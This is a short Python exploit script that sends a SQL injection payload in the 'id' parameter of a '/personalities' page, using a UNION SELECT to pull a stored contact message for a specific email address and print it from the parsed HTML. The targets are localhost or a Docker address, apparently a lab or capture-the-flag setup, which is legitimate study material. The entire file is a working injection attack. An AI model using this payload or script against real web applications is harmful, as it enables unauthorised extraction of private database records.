import sys
import requests
from bs4 import BeautifulSoup
injection = "2' UNION SELECT 'james', message FROM contact_messages WHERE mail = 'james@bond.mi5"


def inject(ip_addr):


	r = requests.get("http://{}/personalities".format(ip_addr), params={'id':injection})

	parser = BeautifulSoup(r.text, "html.parser")
	msg = (parser.find_all('a')[1].string)[len('james:'):]
	print(msg)


if __name__ == '__main__':
	ip_addr = '127.0.0.1'
	if(len(sys.argv)>1):
		ip_addr = '172.17.0.2'
	inject(ip_addr)


